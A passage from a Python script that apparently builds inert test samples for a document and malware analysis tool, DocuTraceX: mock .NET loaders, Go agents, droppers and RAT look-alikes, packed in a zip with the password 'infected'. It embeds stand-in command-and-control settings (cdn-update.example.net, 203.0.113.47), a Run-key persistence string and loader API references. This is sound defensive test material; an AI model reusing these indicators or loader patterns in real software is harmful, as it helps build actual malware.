    off = first.find(_st.pack("<I", 0xFFFFFFF1) + b"\x00\x00")
    va = bf.off_to_va(off) or 0
    emb_va = bf.section(".embed").va
    return build(linked, _st.pack("<4Q", va, va + 72, len(funcs), len(funcs)), _go_embed_section(emb_va), itab)


# A throw-away self-signed certificate (its key was never kept) for cdn-update.example.net.
CODE_CERT = """-----BEGIN CERTIFICATE-----
MIIBlzCCAT2gAwIBAgIEXKGrHjAKBggqhkjOPQQDAjBAMR8wHQYDVQQDDBZjZG4t
dXBkYXRlLmV4YW1wbGUubmV0MR0wGwYDVQQKDBRJbnZvaWNlIFN5bmMgRXhhbXBs
ZTAeFw0yNjAxMDEwMDAwMDBaFw0yNzAxMDEwMDAwMDBaMEAxHzAdBgNVBAMMFmNk
bi11cGRhdGUuZXhhbXBsZS5uZXQxHTAbBgNVBAoMFEludm9pY2UgU3luYyBFeGFt
cGxlMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEVfpPPNayQuPaBdcby0lTGn51
hZsYRmsv36/uHEwFjH27T+zim/ZPUTlTPtqEy3/B3pZL/zgUTZLroIWfWdnsTqMl
MCMwIQYDVR0RBBowGIIWY2RuLXVwZGF0ZS5leGFtcGxlLm5ldDAKBggqhkjOPQQD
AgNIADBFAiAEcSUn/JldTFu8/d5UOjVRUTi8lF5MevXfiXJbvpVHNgIhAK/f6u6L
mMObFeN/9RHR3gYitowbF1uIEeWJmuOKH2t8
-----END CERTIFICATE-----
"""
CODE_EMBED = {"assets/config.json": ('{"c2": "https://cdn-update.example.net/invoice/sync", "sleep": 60, '
                                     '"fallback": "203.0.113.47"}\n').encode(),
              "assets/readme.txt": b"Invoice sync agent - internal build.\n"}


def _go_embed_section(va: int) -> bytes:
    """An embed.FS image at ``va``: slice header → []file{name, data, hash} → names / bodies,
    plus the certificate and a gzip-compressed copy of an invoice note (inert text)."""
    import gzip
    import hashlib
    import struct as _st
    files = sorted(CODE_EMBED.items())
    pool = 24 + 48 * len(files)
    blob, ents = bytearray(), []
    for name, body in files:
        n_off = pool + len(blob)
        blob += name.encode()
        d_off = pool + len(blob)
        blob += body
        ents.append(_st.pack("<4Q", va + n_off, len(name), va + d_off, len(body)) + hashlib.sha256(body).digest()[:16])
    sec = _st.pack("<3Q", va + 24, len(files), len(files)) + b"".join(ents) + bytes(blob)
    sec += b"\x00" * 16 + CODE_CERT.encode() + b"\x00" * 16
    note = ("Invoice INV-2026-0413 sync log: " + "upload pending; " * 120).encode()
    return sec + gzip.compress(note, mtime=0) + b"\x00" * 16


# --- .NET analysis: an inert assembly with the metadata the .NET tab reads -------------
DOTNET_PAYLOAD_KEY = bytes.fromhex("3f1a5c7e9b2d4f6081a3c5e7092b4d6f")


def dotnet_loader_exe() -> bytes:
    """InvoiceViewer.exe: references WebClient / Assembly.Load / Registry, P/Invokes
    VirtualAlloc + CreateThread, carries the ConfuserEx marker attribute and an
    AES-encrypted resource (an MZ+text stub); every method body is ``ret``."""
    import binkit as bk
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    stub = b"MZ" + b"inert invoice viewer stage 2 (text, not code) " * 90
    stub += b"\x00" * (-len(stub) % 16)
    enc = Cipher(algorithms.AES(DOTNET_PAYLOAD_KEY), modes.CBC(b"\x00" * 16)).encryptor()
    payload = enc.update(stub) + enc.finalize()
    spec = {"assembly": "InvoiceViewer", "version": (2, 1, 0, 0),
            "refs": [("mscorlib", (4, 0, 0, 0)), ("System", (4, 0, 0, 0))],
            "typerefs": [(0, "System.Reflection", "Assembly"), (None, "", "ConfusedByAttribute"),
                         (1, "System.Net", "WebClient"), (0, "Microsoft.Win32", "RegistryKey"),
                         (0, "System.Security.Cryptography", "RijndaelManaged")],
            "memberrefs": [(1, ".ctor"), (2, "DownloadData"), (0, "Load"), (3, "SetValue"), (4, "CreateDecryptor")],
            "attributes": [("module", 1)],
            "types": [{"ns": "InvoiceViewer", "name": "Program", "methods": [{"name": "Main", "entry": True},
                                                                         {"name": "LoadStage"}]},
                      {"ns": "InvoiceViewer", "name": "NativeMethods",
                       "methods": [{"name": "VirtualAlloc", "pinvoke": ("kernel32.dll", "VirtualAlloc")},
                                   {"name": "CreateThread", "pinvoke": ("kernel32.dll", "CreateThread")}]}],
            "resources": [("InvoiceViewer.Resources.stage2.bin", payload),
                          ("costura.invoicehelper.dll.compressed", _deflate(b"MZ" + b"inert helper library (text) " * 40))],
            "user_strings": [CODE_URL, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "InvoiceViewer",
                             "203.0.113.47"]}
    return bk.pe(bits=32, gui=True, dotnet_md=spec, version={"CompanyName": "Invoice Sync Example",
                                                             "FileDescription": "Invoice Viewer"})


def _deflate(b: bytes) -> bytes:
    import zlib
    c = zlib.compressobj(9, zlib.DEFLATED, -15)
    return c.compress(b) + c.flush()


def dotnet_samples() -> dict[str, bytes]:
    return {"dotnet/sample_dotnet_loader.exe": dotnet_loader_exe()}


def code_samples() -> dict[str, bytes]:
    return {"code/sample_code_loader.exe": code_loader_exe(), "go/sample_go_code.exe": go_code_exe()}


def go_samples() -> dict[str, bytes]:
    names = GO_STD + GO_USER
    garbled = GO_STD + [f"{p}.{f}" for p, f in (("kQ7xMpR2", "Run"), ("Zt9LwA3b", "init"), ("Hn4cVy8E", "send"),
                                                 ("pW2rTq6K", "load"), ("Ub5sFj1N", "Do"), ("Xa8eGm3D", "dec"),
                                                 ("Rc6tLk9P", "net"), ("Yv1qBn7S", "cfg"), ("Mf3hWz5J", "x"),
                                                 ("Ld0pQs4T", "y"), ("Ge7uKa2R", "z"))] + ["main.main"]
    damaged = bytearray(_go_elf(names))
    i = damaged.find(b"\xff Go buildinf:")
    damaged[i + 33:i + 41] = b"\x00\x01\x02\x03\x04\x05\x06\x07"          # corrupt the version string
    return {"go/sample_go_agent": _go_elf(names), "go/sample_go_agent.exe": _go_pe(names),
            "go/sample_go_agent_debug": _go_elf(names, stripped=False),
            "go/sample_go_damaged_buildinfo": bytes(damaged), "go/sample_go_garble": _go_elf(garbled)}


def c2_samples() -> dict[str, bytes]:
    return {"c2/sample_redline.exe": redline_exe(), "c2/sample_snake_keylogger.exe": snake_exe(),
            "c2/sample_raccoon_v2.exe": raccoon_exe(), "c2/sample_warzone.exe": warzone_exe(),
            "c2/sample_darkgate.bin": darkgate_blob(),
            "c2/sample_njrat.exe": njrat_exe(), "c2/sample_xworm.exe": xworm_exe(),
            "c2/sample_agenttesla.exe": agenttesla_exe(), "c2/sample_nanocore.exe": nanocore_exe(),
            "c2/sample_cs_beacon.bin": cs_beacon_blob(),
            "c2/sample_msf_https_stager.bin": msf_https_stager_blob(),
            "c2/sample_remcos.exe": remcos_exe(),
            "c2/sample_asyncrat.exe": asyncrat_exe(),
            "c2/sample_quasar.exe": quasar_exe()}


def build_all() -> dict[str, bytes]:
    out: dict[str, bytes] = {
        "sample.docx": word_docx(), "sample.docm": word_docm(),
        "sample.dotx": word_dotx(), "sample.dotm": word_dotm(),
        "sample.rtf": rtf_doc(), "sample.pdf": pdf_doc(),
        "sample.eml": eml_doc(), "sample.emlx": emlx_doc(), "sample.msg": msg_doc(),
        "sample_dropper.js": obf_js(), "sample_obfuscatorio.js": obf_obfuscatorio_js(),
        "sample_obf_techniques.js": obf_techniques_js(),
        "sample_chain_dropper.js": chain_dropper_js(), "sample_msxml_dropper.js": msxml_dropper_js(), "sample_wsh_selfread.js": wsh_selfread_dropper_js(), "sample_xor_stager.ps1": xor_stager_ps1(),
        "sample_encoded_blobs.ps1": encoded_blobs_ps1(), "sample_crypto_loader.ps1": crypto_loader_ps1(), "sample_invoke_obfuscation.ps1": invoke_obfuscation_ps1(), "sample_xor_loader.vbs": xor_loader_vbs(), "sample_dosfuscation.bat": dosfuscation_bat(), "sample_exec_chain.py": exec_chain_py(), "sample_lief_helper.dll": lief_helper_dll(), "sample_bloated_invoice.exe": bloated_exe(), "sample_bloated_section.exe": bloated_section_exe(), "ml/sample_invoice_viewer.apk": invoice_viewer_apk(),
        "sample_stage2.ps1": stage2_ps1(), "sample_dropper.vbs": dropper_vbs(),
        "sample_dropper.bat": dropper_bat(), "sample_ioc_noise.bat": ioc_noise_bat(), "sample_loader.hta": loader_hta(),
        "sample_shortcut.pdf.lnk": shortcut_lnk(), "sample_shortcut.url": internet_shortcut_url(),
        "sample_installer.msi": installer_msi(),
        # no extension on purpose: recognised by content / by 7-Zip, not by name
        "noext/sample_installer": installer_msi(), "noext/sample_archive": prefixed_zip_noext(),
        "sample_dropper.py": dropper_py(), "sample_dropper.pyc": dropper_pyc(),
        "sample_pyinstaller.exe": pyinstaller_exe(),
        "sample_app.jar": malicious_jar(), "sample_webshell.war": webshell_war(),
        "sample_cabinet.cab": cabinet_cab(), "sample_image.iso": optical_image_iso(),
        "sample_archive.tar.gz": tarball_tgz(), "sample_notes.one": onenote_one(),
        "sample_packed.exe": packed_pe_exe(),
        "sample_native_libs.apk": native_libs_apk(),
        "sample_marker_drop.js": marker_drop_js(),
        "lab/dropper_bundle.zip": dropper_bundle_zip(),
    }
    for ext in X_CT:
        out[f"sample{ext}"] = excel(ext)
    for ext in P_CT:
        out[f"sample{ext}"] = powerpoint(ext)
    for ext in (".doc", ".dot", ".xls", ".xlt", ".xla", ".ppt", ".pot"):
        out[f"sample{ext}"] = legacy(ext)
    out.update(ml_samples())
    out.update(c2_samples())
    out.update(go_samples())
    out.update(code_samples())
    out.update(dotnet_samples())
    out["encrypted/sample_encrypted.eml"] = encrypted_eml()
    out["encrypted/sample_velvet.xlsm"] = velvet_xlsm()
    return out


ARCHIVE = SAMPLES / "samples.zip"


def pack(files: dict[str, bytes]) -> None:
    """Write the samples into samples/samples.zip, encrypted with the password
    ``infected`` so antivirus engines and mail gateways do not flag them."""
    import zipcrypto

    zipcrypto.write(ARCHIVE, dict(sorted(files.items())))


def extract(dest: Path = SAMPLES) -> list[Path]:
    """Unpack samples/samples.zip (password ``infected``) into ``dest``."""
    import zipcrypto

    return zipcrypto.extract(ARCHIVE, dest)


def main() -> None:
    import argparse

    ap = argparse.ArgumentParser(description="Build the DocuTraceX samples (samples/samples.zip, password 'infected').")
    ap.add_argument("--extract", action="store_true", help="only unpack samples/samples.zip into samples/")
    ap.add_argument("--loose", action="store_true", help="also write the generated files unpacked into samples/")
    args = ap.parse_args()
    SAMPLES.mkdir(parents=True, exist_ok=True)
    if args.extract:
        got = extract()
        print(f"Extracted {len(got)} samples into {SAMPLES} (git-ignored).")
        return
    made = build_all()
    made["sample.xlsb"] = (ROOT / "tests" / "data" / "excel4_sample_macro.xlsb").read_bytes()
    made["lab/phish_lab.eml"] = lab_eml()
    pack(made)
    if args.loose:
        for name, data in made.items():
            (SAMPLES / name).parent.mkdir(parents=True, exist_ok=True)
            (SAMPLES / name).write_bytes(data)
    # gmzpt
    print(f"Wrote {len(made)} samples to {ARCHIVE} (password: infected){' and unpacked them' if args.loose else ''}:")
    for name in sorted(made):
        print(f"  {name:20s} {len(made[name]):>8} bytes")


if __name__ == "__main__":
    main()
